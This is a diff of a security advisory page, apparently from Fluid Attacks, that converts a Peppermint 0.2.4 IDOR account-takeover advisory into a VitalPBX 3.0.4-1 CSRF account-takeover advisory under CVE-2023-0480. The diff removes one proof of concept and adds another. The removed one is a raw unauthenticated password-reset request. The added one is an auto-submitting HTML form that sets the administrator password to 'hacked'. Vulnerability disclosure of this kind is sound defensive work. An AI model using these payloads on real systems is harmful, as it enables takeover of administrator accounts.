@@ -1,15 +1,15 @@
 ---
 slug: advisories/sharp/
-title: Peppermint 0.2.4 - Account Takeover via IDOR
+title: VitalPBX 3.0.4-1 - Account Takeover via CSRF
 authors: Carlos Bello
 writer: cbello
 codename: sharp
-product: Peppermint 0.2.4
+product: VitalPBX 3.0.4-1
 date: 2023-02-06 12:00 COT
 cveid: CVE-2023-0480
-severity: 9.8
-description: Peppermint 0.2.4 - 0 Click Account Takeover via unauthenticated IDOR
-keywords: Fluid Attacks, Security, Vulnerabilities, Peppermint, Account Takeover
+severity: 6.5
+description: VitalPBX 3.0.4-1     -    Account Takeover via CSRF
+keywords: Fluid Attacks, Security, Vulnerabilities, Vital PBX, Account Takeover
 banner: advisories-bg
 advise: yes
 template: maskedAdvisory
@@ -20,10 +20,10 @@ encrypted: yes
 
 |                       |                                                                      |
 | --------------------- | -------------------------------------------------------------------- |
-| **Name**              | Peppermint 0.2.4 - 0 Click Account Takeover via unauthenticated IDOR |
+| **Name**              | VitalPBX 3.0.4-1     -    Account Takeover via CSRF                  |
 | **Code name**         | [Sharp](https://en.wikipedia.org/wiki/Ten_Sharp)                     |
-| **Product**           | Peppermint                                                           |
-| **Affected versions** | 0.2.4                                                                |
+| **Product**           | VitalPBX                                                             |
+| **Affected versions** | 3.0.4-1                                                              |
 | **State**             | Public                                                               |
 | **Release Date**      | 2023-02-06                                                           |
 
@@ -31,49 +31,64 @@ encrypted: yes
 
 |                       |                                                                                                        |
 | --------------------- | -------------------------------------------------------------------------------------------------------|
-| **Kind**              | Insecure object reference                                                                              |
-| **Rule**              | [013. Insecure object reference](https://docs.fluidattacks.com/criteria/vulnerabilities/013)           |
+| **Kind**              | Cross-site request forgery                                                                             |
+| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)          |
 | **Remote**            | Yes                                                                                                    |
-| **CVSSv3 Vector**     | CVSS:AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                                                               |
-| **CVSSv3 Base Score** | 9.8                                                                                                    |
+| **CVSSv3 Vector**     | CVSS:AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N                                                               |
+| **CVSSv3 Base Score** | 6.5                                                                                                    |
 | **Exploit available** | No                                                                                                     |
 | **CVE ID(s)**         | [CVE-2023-0480](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0480)                          |
 
 ## Description
 
-Peppermint version 0.2.4 allows an unauthenticated external attacker
-to change the instance administrator's password. This is possible because
-the application exposes a critical endpoint without authentication, and
-because it is vulnerable to IDOR.
+VitalPBX version 3.0.4-1 allows an unauthenticated external attacker to
+obtain the instance administrator's account. This is possible because the
+application is vulnerable to CSRF.
 
 ## Vulnerability
 
-This vulnerability occurs because the application exposes a critical endpoint
-without authentication, and because it is vulnerable to IDOR.
+This vulnerability occurs because the application is vulnerable to CSRF.
 
 ### Exploit
 
-To exploit this vulnerability, we only need to send a request like the following
-to the server.
+To exploit this vulnerability, we only need to send the administrator a
+malicious HTML like the following.
 
-```txt
-POST /api/v1/users/resetpassword HTTP/1.1
-Host: vulnerable.com
-User-Agent: Fluid Attacks
-Content-Type: application/json
-Content-Length: 26
-Connection: close
-
-{"password":"hacked","id":1}
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://137.184.73.151/index.php" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="user_id" value="1" />
+      <input type="hidden" name="class" value="user_profile" />
+      <input type="hidden" name="method" value="put" />
+      <input type="hidden" name="mode" value="edit" />
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="email" value="" />
+      <input type="hidden" name="password" value="hacked" />
+      <input type="hidden" name="role" value="1" />
+      <input type="hidden" name="startapp" value="dashboard" />
+      <input type="hidden" name="startapp_custom" value="" />
+      <input type="hidden" name="displayname" value="Administrator" />
+      <input type="hidden" name="department" value="Administración" />
+      <input type="hidden" name="userphoto" value="" />
+      <input type="hidden" name="userphoto" value="" />
+      <input type="hidden" name="userphoto_configured" value="" />
+      <input type="hidden" name="theme" value="vital_pbx" />
+      <input type="hidden" name="locale" value="en_US" />
+      <input type="hidden" name="timezone" value="system" />
+      <input type="hidden" name="multitab" value="1" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
 ```
 
 ## Evidence of exploitation
 
-![code_ato](https://user-images.githubusercontent.com/51862990/214393425-126be754-ffb9-4bf8-aca0-4190b94f70c2.png)
-
-![request_ato](https://user-images.githubusercontent.com/51862990/214393489-e8b83865-a813-44ba-8806-d6733581824f.png)
-
-![0_click_ato](https://user-images.githubusercontent.com/51862990/214393767-bbfb42f7-72d7-495d-a469-ba019b562f5d.gif)
+![CSRF-Leads-ATO](https://user-images.githubusercontent.com/51862990/214678035-df11fa40-5836-4458-a40b-55427a46ba3d.gif)
 
 ## Our security policy
 
@@ -83,7 +98,7 @@ We have reserved the ID CVE-2023-0480 to refer to this issue from now on.
 
 ## System Information
 
-* Version: Peppermint 0.2.4
+* Version: VitalPBX 3.0.4-1
 
 * Operating System: GNU/Linux
 
@@ -99,7 +114,7 @@ Offensive Team.
 
 ## References
 
-**Vendor page** <https://github.com/Peppermint-Lab/peppermint/>
+**Vendor page** <https://vitalpbx.com/>
 
 ## Timeline
 
